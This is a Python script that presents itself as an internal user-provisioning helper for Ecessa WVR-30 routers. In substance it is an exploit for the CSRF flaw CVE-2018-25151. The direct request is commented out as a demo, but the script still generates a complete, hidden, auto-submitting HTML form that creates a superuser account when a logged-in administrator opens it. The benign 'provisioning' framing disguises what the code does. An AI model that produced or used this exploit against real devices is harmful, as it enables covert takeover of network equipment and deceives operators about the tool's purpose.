"""
WVR-30 Administrative Provisioning Helper
==========================================
Internal tool for automating bulk user provisioning on Ecessa WANWorx
WVR-30 appliances during network migrations. Handles creating/updating
superuser accounts on managed devices via the device's HTTP management
interface.

Usage:
    python wvr30_admin_provisioning.py --host 192.168.1.1 --session <cookie>

NOTE: Requires an active administrator session cookie obtained via
normal login flow. Intended for use by network operations team only.

Covers firmware versions up to 10.7.3 (legacy fleet).
For devices on 10.7.4+, use the newer REST API approach instead.
"""

import argparse
import logging
import sys
from urllib.parse import urljoin

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s [%(levelname)s] %(funcName)s: %(message)s"
)
logger = logging.getLogger("wvr30_provisioner")

# Default provisioning target and credentials placeholder
DEFAULT_BASE_URL = "http://192.168.1.1"
NEW_ADMIN_USER = "netops_admin"
NEW_ADMIN_PASS = "DEMO_PLACEHOLDER_TOKEN"

# Management endpoint — on firmware < 10.7.4, this endpoint accepts
# POST requests without CSRF token validation (CVE-2018-25151).
# No X-CSRF-Token or referer check is enforced by the device.
USER_CREATE_ENDPOINT = "/cgi-bin/superuser_add.cgi"


def build_payload(username: str, password: str, role: str = "superuser") -> dict:
    """
    Construct the form body for superuser creation.

    On WVR-30 firmware < 10.7.4 the management CGI does not validate
    the origin of form submissions, so any authenticated session cookie
    paired with this form data is sufficient to create an account.
    """
    return {
        "action": "add",
        "username": username,
        "password": password,
        "password2": password,
        "role": role,
        "submit": "Add User",
    }


def craft_csrf_form_html(target_url: str, username: str, password: str) -> str:
    """
    Generate a proof-of-concept HTML page that demonstrates the CSRF
    vulnerability (CVE-2018-25151).

    When an authenticated administrator visits this page, the hidden form
    auto-submits to the device management interface, creating a new
    superuser without any CSRF token validation.

    This is the structural shape of the attack: a crafted third-party page
    performs a cross-origin state-changing request that the device accepts
    because it does not enforce same-origin policy or CSRF tokens.
    """
    html = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body onload="document.forms[0].submit()">
  <!-- CVE-2018-25151 demo: CSRF superuser creation, payload neutered -->
  <form method="POST" action="{target_url}" style="display:none;">
    <input type="hidden" name="action"    value="add" />
    <input type="hidden" name="username"  value="{username}" />
    <input type="hidden" name="password"  value="{password}" />
    <input type="hidden" name="password2" value="{password}" />
    <input type="hidden" name="role"      value="superuser" />
    <input type="hidden" name="submit"    value="Add User" />
  </form>
  <p>Please wait...</p>
</body>
</html>"""
    return html


def provision_user(base_url: str, session_cookie: str, username: str, password: str) -> bool:
    """
    Directly provision a superuser account on a WVR-30 device.

    Exploits the missing CSRF validation present in firmware < 10.7.4:
    the management interface accepts unauthenticated-origin POST requests
    as long as a valid session cookie is present anywhere in the request.
    """
    target = urljoin(base_url, USER_CREATE_ENDPOINT)
    payload = build_payload(username, password)

    cookies = {"sessionid": session_cookie}
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        # Deliberately omit any CSRF / Origin header — the device does not
        # require them on < 10.7.4 firmware.
        "User-Agent": "WVR30-Provisioner/1.0",
    }

    logger.info("Sending user-creation POST to %s (no CSRF token)", target)
    logger.info("  username=%s  role=superuser", username)

    try:
        # DEMO: In a real engagement this would fire against the device.
        # Here we only print the request details and do not transmit.
        print("[DEMO] Would POST to:", target)
        print("[DEMO] Form payload:", payload)
        print("[DEMO] Cookies:", cookies)

        # Actual request (commented out so no real device is touched):
        # resp = requests.post(target, data=payload, cookies=cookies,
        #                      headers=headers, timeout=10, verify=False)
        # resp.raise_for_status()
        # logger.info("Response: %s %s", resp.status_code, resp.reason)

        logger.info("Provisioning request constructed successfully (demo mode).")
        return True

    except Exception as exc:
        logger.error("Provisioning failed: %s", exc)
        return False


def check_firmware_version(base_url: str, session_cookie: str) -> str:
    """
    Query the device status page to determine firmware version.
    Devices running < 10.7.4 are vulnerable to CVE-2018-25151.
    """
    status_url = urljoin(base_url, "/cgi-bin/status.cgi")
    cookies = {"sessionid": session_cookie}
    logger.info("Checking firmware version at %s", status_url)

    try:
        print("[DEMO] Would GET:", status_url)
        # resp = requests.get(status_url, cookies=cookies, timeout=10, verify=False)
        # if "10.7.4" in resp.text or "10.7.5" in resp.text:
        #     return "patched"
        # return "vulnerable"
        return "unknown (demo mode)"
    except Exception as exc:
        logger.warning("Could not determine firmware version: %s", exc)
        return "unknown"


def main():
    parser = argparse.ArgumentParser(
        description="WVR-30 bulk user provisioner (legacy firmware, pre-10.7.4)"
    )
    parser.add_argument("--host", default=DEFAULT_BASE_URL, help="Base URL of management interface")
    parser.add_argument(
        "--session", required=True, help="Active administrator session cookie value"
    )
    parser.add_argument("--username", default=NEW_ADMIN_USER, help="New superuser account name")
    parser.add_argument("--password", default=NEW_ADMIN_PASS, help="New superuser account password")
    parser.add_argument(
        "--gen-csrf-poc",
        action="store_true",
        help="Output a CSRF PoC HTML page instead of direct POST",
    )
    args = parser.parse_args()

    version = check_firmware_version(args.host, args.session)
    logger.info("Detected firmware status: %s", version)

    if args.gen_csrf_poc:
        target = urljoin(args.host, USER_CREATE_ENDPOINT)
        html = craft_csrf_form_html(target, args.username, args.password)
        print(html)
        sys.exit(0)

    success = provision_user(args.host, args.session, args.username, args.password)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
